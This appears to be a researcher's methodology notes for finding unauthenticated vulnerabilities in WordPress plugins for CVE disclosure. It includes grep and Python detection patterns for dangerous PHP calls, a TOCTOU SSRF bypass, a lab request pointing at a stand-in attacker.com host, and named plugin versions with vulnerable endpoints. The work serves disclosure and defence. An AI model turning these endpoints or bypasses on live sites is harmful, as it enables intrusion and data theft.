# WordPress Plugin Source-Code Audit for Zero-Day Hunting

Target: find UNAUTHENTICATED vulnerabilities in WordPress plugins for
Patchstack CVE submission. Unauthenticated bugs get CVEs fastest and pay
the most.

## Plugin Selection Strategy

**Target mid-tier plugins** (10k–500k installs, not recently updated):
- Top plugins (1M+ installs) are already heavily audited
- Brand-new plugins have fewer installs = lower impact rating
- Plugins not updated in 6+ months are more likely to have stale code patterns
- Focus on plugins that handle: file uploads, form submissions, AJAX actions,
  API integrations, booking/event systems, newsletter/email, user-generated content

### Download Script

```bash
# Download multiple plugins at once from wordpress.org
cd /tmp/wp-audit
for slug in buddyforms wp-file-upload user-submitted-posts checkout-files-upload; do
  curl -sL "https://downloads.wordpress.org/plugin/${slug}.zip" -o "${slug}.zip"
  unzip -qo "${slug}.zip"
done
```

## Scan Pipeline

### Step 1: Grep for `wp_ajax_nopriv_` (Unauthenticated AJAX)

This is the #1 signal. `nopriv` actions are reachable without login.

```bash
grep -rn 'wp_ajax_nopriv_' --include='*.php' /tmp/wp-audit/ | \
  grep -v 'vendor/' | grep -v 'node_modules/'
```

For each hit, check:
1. Is there a `check_ajax_referer()` or `wp_verify_nonce()` call?
2. Is there a `current_user_can()` or `is_user_logged_in()` check?
3. If NO to both → **unauthenticated endpoint confirmed**

### Step 2: Grep for Dangerous Patterns

```bash
# SQL injection (direct $_GET/$_POST/$_REQUEST in queries)
grep -rn '\$wpdb->query\|\$wpdb->get_var\|\$wpdb->get_row\|\$wpdb->get_results\|\$wpdb->prepare' \
  --include='*.php' /tmp/wp-audit/ | grep '\$_GET\|\$_POST\|\$_REQUEST'

# File upload handling
grep -rn 'wp_handle_upload\|wp_upload_bits\|move_uploaded_file\|file_get_contents' \
  --include='*.php' /tmp/wp-audit/ | grep -v 'vendor/'

# SSRF (remote fetch from user-controlled URL)
grep -rn 'wp_remote_get\|wp_safe_remote_get\|wp_remote_post\|curl_exec\|file_get_contents' \
  --include='*.php' /tmp/wp-audit/ | grep -v 'vendor/' | grep '\$_GET\|\$_POST\|\$_REQUEST'

# File inclusion
grep -rn 'include\|require' --include='*.php' /tmp/wp-audit/ | \
  grep '\$_GET\|\$_POST\|\$_REQUEST' | grep -v 'vendor/'

# Deserialization
grep -rn 'unserialize\|maybe_unserialize' --include='*.php' /tmp/wp-audit/ | \
  grep -v 'vendor/' | grep '\$_GET\|\$_POST\|\$_REQUEST'

# REST API endpoints with no permission_callback
grep -rn 'permission_callback' --include='*.php' /tmp/wp-audit/ | \
  grep '__return_true\|null\|false'
```

### Step 3: Automated Multi-Pattern Scan (Python)

```python
import os, re, json

AUDIT_DIR = '/tmp/wp-audit'
PATTERNS = {
    'SQL_INJECTION': r'\$wpdb->(?:query|get_var|get_row|get_results|prepare)\s*\([^)]*\$(?:_GET|_POST|_REQUEST)',
    'XSS': r'echo\s+\$(?:_GET|_POST|_REQUEST)',
    'SSRF': r'(?:wp_remote_get|wp_safe_remote_get|curl_exec|file_get_contents)\s*\([^)]*\$(?:_GET|_POST|_REQUEST)',
    'FILE_UPLOAD': r'(?:wp_handle_upload|wp_upload_bits|move_uploaded_file)',
    'FILE_INCLUSION': r'(?:include|require)(?:_once)?\s*\([^)]*\$(?:_GET|_POST|_REQUEST)',
    'UNSERIALIZE': r'unserialize\s*\([^)]*\$(?:_GET|_POST|_REQUEST)',
    'REST_NO_PERM': r'permission_callback.*__return_true',
    'NOPRIV_AJAX': r'wp_ajax_nopriv_',
    'EVAL': r'eval\s*\(',
    'EXEC': r'(?:exec|system|shell_exec|passthru|popen)\s*\(',
}

results = {}
for root, dirs, files in os.walk(AUDIT_DIR):
    dirs[:] = [d for d in dirs if d not in ('vendor', 'node_modules', '.git')]
    for f in files:
        if not f.endswith('.php'): continue
        path = os.path.join(root, f)
        try:
            content = open(path, errors='ignore').read()
        except: continue
        for name, pattern in PATTERNS.items():
            matches = re.findall(pattern, content)
            if matches:
                results.setdefault(path, {})[name] = len(matches)

print(json.dumps(results, indent=2))
```

## Vulnerability Validation Checklist

For each finding, verify ALL of these:

### Auth Check
- [ ] Is the endpoint registered with `wp_ajax_nopriv_`? (unauthenticated)
- [ ] If `wp_ajax_` only, does it check `is_user_logged_in()` or `current_user_can()`?
- [ ] Is there a `check_ajax_referer()` / `wp_verify_nonce()` call?
- [ ] Is there a capability check (`current_user_can('manage_options')` etc.)?

### Sanitization Check
- [ ] SQL: Is input passed through `$wpdb->prepare()` or `esc_sql()`?
- [ ] SQL: Is `sanitize_email()` / `sanitize_text_field()` used? (strips dangerous chars)
- [ ] XSS: Is output passed through `esc_html()` / `esc_attr()` / `wp_kses()`?
- [ ] File: Is `wp_check_filetype()` used? Does it check against an allowed-types list?
- [ ] File: Is the upload directory web-accessible? Can PHP execute there?
- [ ] SSRF: Does `wp_safe_remote_get()` block internal IPs? (it does by default)
- [ ] SSRF: Is there a TOCTOU — separate fetches for validation vs. saving?

### Reachability Check
- [ ] Is the vulnerable function actually called? (dead code is not a bug)
- [ ] Is the function hooked to an action/filter that fires?
- [ ] Are there conditions that prevent reaching the vulnerable code path?

### Common False Positives
| Pattern | Why It's NOT Exploitable |
|---|---|
| `esc_sql($input)` in SQL | Escapes dangerous characters |
| `sanitize_email($input)` in SQL | Strips everything except email-safe chars |
| `floatval($input)` for XSS | Returns float, no string output |
| `wp_safe_remote_get()` for SSRF | Blocks internal IPs by default |
| Dead code (function defined, never called) | Not reachable |
| `wp_ajax_nopriv_` + `check_ajax_referer()` | Nonce blocks unauthenticated |
| Upload with nonce check | Nonce required |
| Upload requiring `is_user_logged_in()` | Auth required |

## Key Vulnerability Classes in WP Plugins

### 1. Unauthenticated SSRF via URL Fetch
- Pattern: `wp_safe_remote_get($_POST['url'])` in `wp_ajax_nopriv_` handler
- Bypass: `getimagesize($url)` does a SEPARATE fetch → TOCTOU (return valid
  image for getimagesize, malicious content for wp_safe_remote_get)
- Impact: Server makes outbound HTTP requests to attacker-controlled URLs

### 2. Unauthenticated File Upload
- Pattern: `wp_upload_bits()` or `wp_handle_upload()` in `wp_ajax_nopriv_`
- Check: Is file extension validated? Is `.htaccess` present in upload dir?
- Impact: Arbitrary file upload → potential RCE if PHP execution allowed

### 3. SQL Injection via AJAX
- Pattern: `$wpdb->query("... $variable ...")` without `prepare()`
- Check: Is the variable from `$_GET/$_POST/$_REQUEST`?
- Check: Is `esc_sql()` applied? (escapes quotes, but doesn't prevent all injection)
- Impact: Data exfiltration, auth bypass, RCE via `INTO OUTFILE`

### 4. Unauthenticated Form Submission
- Pattern: `wp_ajax_nopriv_` handler that processes form data without nonce
- Check: Can unauthenticated users submit data that gets stored in the DB?
- Impact: Spam injection, potential stored XSS, data pollution

## Local WP Lab Setup

```bash
# Activate only the plugin under test via MySQL (wp-cli may hang)
mysql -u wpuser -p<password> -h 127.0.0.1 wordpress -e \
  "UPDATE wp_options SET option_value='a:1:{i:0;s:19:\"buddyforms/BuddyForms.php\";}' WHERE option_name='active_plugins';"

# Test the AJAX endpoint
curl -X POST 'http://127.0.0.1/wp-admin/admin-ajax.php' \
  -d 'action=upload_image_from_url' \
  -d 'url=http://attacker.com/image.png'
```

**Pitfall**: If Apache + WordPress hangs, deactivate all other plugins via
MySQL `active_plugins` option. Too many active plugins causes wp-cli and
Apache to hang on startup.

## Session Lessons (Aug 2026)

### Plugins Audited — Not Exploitable
| Plugin | Finding | Why Safe |
|---|---|---|
| string-locator | SQL injection in REST save | Authenticated only (manage_options) |
| health-check | File integrity | validate_file() + checksums |
| yop-poll | REST API | Nonce + permission checks |
| dnd-cf7 | File upload | Nonce + blacklist + .htaccess |
| wp-job-manager | File upload | Requires login despite no nonce |
| wpdiscuz | Delete attachment | Nonce checks |
| newsletter | Token-based auth | TODO comment re: token, but limited impact |
| pods | Upload (nopriv) | Nonce + uri_hash required |
| all-in-one-wp-migration | Export/import | Secret key from DB, not predictable |
| weforms | Upload | Nonce check present |
| poll-wp | AJAX | Nonce checks |
| ecommerce-product-catalog | Formbuilder upload | Dead code (function never called) |
| events-made-easy | XSS | floatval() sanitizes |
| secure-copy-content-protection | SQL injection | sanitize_email() strips dangerous chars |

### Confirmed Vulnerable
| Plugin | Version | Vuln | Endpoint |
|---|---|---|---|
| BuddyForms | 2.9.0 | Unauth SSRF + TOCTOU | `POST admin-ajax.php action=upload_image_from_url` |
| Iptanus File Upload | 5.1.10 | SQL injection (needs nonce) | `wp_ajax_nopriv_wfu_ajax_action` |
| Checkout Files Upload (WooCommerce) | 2.2.6 | Arbitrary file upload (empty accepted types) | `validate_file_type()` skips when `$files_accepted` is empty |
